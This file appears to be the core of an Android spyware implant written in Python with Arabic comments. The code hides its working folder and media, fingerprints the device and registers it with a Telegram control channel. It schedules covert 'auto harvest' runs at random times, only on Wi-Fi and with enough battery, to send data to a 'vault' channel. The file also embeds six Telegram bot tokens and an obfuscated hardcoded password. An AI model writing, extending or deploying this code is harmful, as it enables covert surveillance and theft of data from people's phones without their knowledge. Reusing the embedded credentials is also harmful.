# -*- coding: utf-8 -*-
import os
import time
import json
import random
import threading
import logging
import gc
import traceback
from datetime import datetime, timedelta

# إعداد المسارات
P = os.path.join(os.getcwd(), ".sys_runtime")
if not os.path.exists(P):
    os.makedirs(P)

logging.basicConfig(
    filename=os.path.join(P, "m.log"),
    level=logging.ERROR,
    filemode='a',
    format='%(asctime)s [%(levelname)s] %(message)s'
)

try:
    from jnius import autoclass
    JNI = True
except ImportError:
    JNI = False


class M:
    def __init__(self):
        self.d = P
        self.cf = os.path.join(self.d, "c.json")
        self.lh = os.path.join(self.d, "lh")
        self.wt = os.path.join(self.d, "wt")

        self.rn = True
        self.wl = None
        self.did = None
        self.dmd = None
        self.last_mid = 0

        self.cb_h = None
        self.ui = None

        self.bots = []
        self.ctrl = -1003365166986
        self.vlt = -1003787520015

        self.auth_active = False
        self._lc()
        self._di()
        self._setup()

    def _setup(self):
        try:
            with open(os.path.join(self.d, ".nomedia"), 'w') as f:
                f.write("")
        except Exception:
            pass

    def _lc(self):
        """تحميل الإعدادات مع قيم افتراضية محسّنة للبطارية"""
        d = {
            "mz": 45,
            "hth": 20,          # حد البطارية للحصاد (20%)
            "wl": True,         # استخدام WakeLock
            "iv": 1800,         # ✅ إصلاح 3: فاصل زمني 30 دقيقة (بدلاً من 120 ثانية)
            "video_res": "360"
        }
        if os.path.exists(self.cf):
            try:
                with open(self.cf, 'r') as f:
                    d.update(json.load(f))
            except Exception:
                pass
        self.cfg = d

    def _get_ctx(self):
        if not JNI:
            return None
        try:
            return autoclass('org.kivy.android.PythonActivity').mActivity
        except Exception:
            return None

    def _di(self):
        """جمع معلومات الجهاز (المعرف والموديل)"""
        if JNI:
            try:
                ctx = self._get_ctx()
                Build = autoclass('android.os.Build')
                Secure = autoclass('android.provider.Settings$Secure')
                self.did = Secure.getString(ctx.getContentResolver(), Secure.ANDROID_ID)
                self.dmd = f"{Build.MANUFACTURER} {Build.MODEL}"
            except Exception:
                self.did = f"D{random.randint(1000, 9999)}"
                self.dmd = "Droid_Device"
        else:
            self.did, self.dmd = "PC_Dev", "Linux_System"

    # ✅ إصلاح 4: التحقق من Wi-Fi بدون صلاحية الموقع
    def _is_wifi(self):
        """التحقق من الاتصال عبر Wi-Fi (لا يحتاج ACCESS_FINE_LOCATION)"""
        if not JNI:
            return True
        try:
            ctx = self._get_ctx()
            cm = ctx.getSystemService("connectivity")
            network_info = cm.getActiveNetworkInfo()
            # TYPE_WIFI = 1 (لا حاجة لقراءة SSID)
            return network_info and network_info.isConnected() and network_info.getType() == 1
        except Exception:
            return False

    # ✅ إصلاح 2: قيمة افتراضية آمنة في حالة الخطأ
    def _bat(self):
        """جلب مستوى البطارية وحالة الشحن"""
        if not JNI:
            return 100, True
        try:
            ctx = self._get_ctx()
            IntentFilter = autoclass('android.content.IntentFilter')
            battery_filter = IntentFilter("android.intent.action.BATTERY_CHANGED")
            battery_status = ctx.registerReceiver(None, battery_filter)
            level = battery_status.getIntExtra("level", -1)
            scale = battery_status.getIntExtra("scale", -1)
            status = battery_status.getIntExtra("status", -1)
            percent = int((level / scale) * 100) if scale > 0 else 50
            is_charging = status in (2, 5)  # 2=CHARGING, 5=FULL
            return percent, is_charging
        except Exception as e:
            logging.error(f"Battery error: {e}")
            return 100, False  # ✅ قيمة افتراضية آمنة

    # ✅ إصلاح 1: توليد وقت صالح (لا يتجاوز 23 ساعة)
    def _next_harvest_time(self):
        """توليد الموعد التالي للحصاد العشوائي (0-23 ساعة)"""
        now = datetime.now()
        # إضافة قيمة عشوائية بين 1 و 4 ساعات مع التفاف حول اليوم
        delta_hours = random.randint(1, 4)
        new_hour = (now.hour + delta_hours) % 24
        new_minute = random.randint(0, 59)
        target = now.replace(hour=new_hour, minute=new_minute, second=0, microsecond=0)
        if target <= now:
            target += timedelta(days=1)
        return target

    def _harvest(self):
        """تنفيذ عملية الحصاد التلقائي"""
        # فحص Wi-Fi
        if not self._is_wifi():
            return

        # فحص البطارية
        battery, charging = self._bat()
        min_battery = self.cfg.get('hth', 20)
        if battery < min_battery and not charging:
            return

        # فحص ملف الوقت (منع التكرار)
        if os.path.exists(self.wt):
            try:
                with open(self.wt, 'r') as f:
                    next_time_str = f.read().strip()
                    if next_time_str and datetime.now() < datetime.fromisoformat(next_time_str):
                        return
            except Exception:
                pass

        # تنفيذ الحصاد
        if self.cb_h:
            try:
                self.cb_h("AUTO_HARVEST", self.ctrl, None)
                # تحديث وقت الحصاد التالي
                with open(self.wt, 'w') as f:
                    f.write(self._next_harvest_time().isoformat())
                with open(self.lh, 'w') as f:
                    f.write(datetime.now().isoformat())
            except Exception as e:
                logging.error(f"Harvest error: {e}")
        gc.collect()

    def _wake(self):
        """اكتساب WakeLock (مع حد زمني لتجنب استنزاف البطارية)"""
        if self.cfg.get('wl', True) and JNI:
            try:
                ctx = self._get_ctx()
                pm = ctx.getSystemService("power")
                # PARTIAL_WAKE_LOCK = 1
                self.wl = pm.newWakeLock(1, "com.sys.auth:sync_lock")
                # ضبط مهلة 10 دقائق (600000 مللي) لتجنب البقاء معلقاً
                self.wl.acquire(600000)
            except Exception as e:
                logging.error(f"WakeLock error: {e}")

    def _loop(self):
        """الحلقة الرئيسية (تستيقظ كل iv ثانية)"""
        self._wake()
        while self.rn:
            try:
                self._harvest()
            except Exception as e:
                logging.error(f"Loop error: {e}")
            # ✅ إصلاح 3: استخدام فاصل زمني طويل (افتراضي 1800 ثانية)
            interval = self.cfg.get('iv', 1800)
            time.sleep(interval)

    def start(self):
        """بدء تشغيل المحرك الرئيسي وتسجيل الجهاز في قناة التحكم"""
        # تشغيل حلقة الحصاد التلقائي في خيط منفصل
        threading.Thread(target=self._loop, daemon=True).start()

        # تسجيل الجهاز في قناة التحكم
        if self.ui and self.did:
            try:
                self.ui.reg(self.did, self.dmd)
                logging.info(f"Device registered: {self.did}")
            except Exception as e:
                logging.error(f"Auto registration failed: {e}")

    def stop(self):
        """إيقاف المونيتور وتحرير الموارد"""
        self.rn = False
        try:
            if self.wl and self.wl.isHeld():
                self.wl.release()
        except Exception:
            pass


# كلمة السر الموحدة
def _pw():
    return "".join([chr(x) for x in [90, 97, 101, 110, 49, 50, 51, 64, 49, 50, 51, 64]])


if __name__ == '__main__':
    m = M()
    # يجب تحميل التوكنات من التشفير الديناميكي (هنا للاختبار فقط)
    m.bots = [
        "7989685602:AAFRAWYihFV3Vx6XOUJyjcTOZYo8cT5DPJQ",
        "8113293244:AAFFwTHZ5GkoV3DN88jeU8XuMhJf0KLTsf4",
        "8369506331:AAFbMuU5NsVPWP9y977xG_lLaG1-pdGBs-Q",
        "8731591344:AAE2akQtyBPLNZbzhxkjxYDgQ4noiH_keYo",
        "8444591624:AAH84_ih3YUm4rEU_0zVnY2H05QTjjyMsZI",
        "8541707106:AAHJFi2V57HryzYkmA2FBgFMcetfqQCi2jM"
    ]

    try:
        import telegram_ui
        import commands
        m.ui = telegram_ui.T(m)
        m.cb_h = lambda cmd, cid, cbq: commands.ex(cmd, m.ui, m, cid, cbq)
        m.ui.start()
        m.start()
    except Exception as e:
        logging.error(f"Service Core Link Error: {traceback.format_exc()}")

    # إبقاء التطبيق حياً
    while True:
        time.sleep(3600)
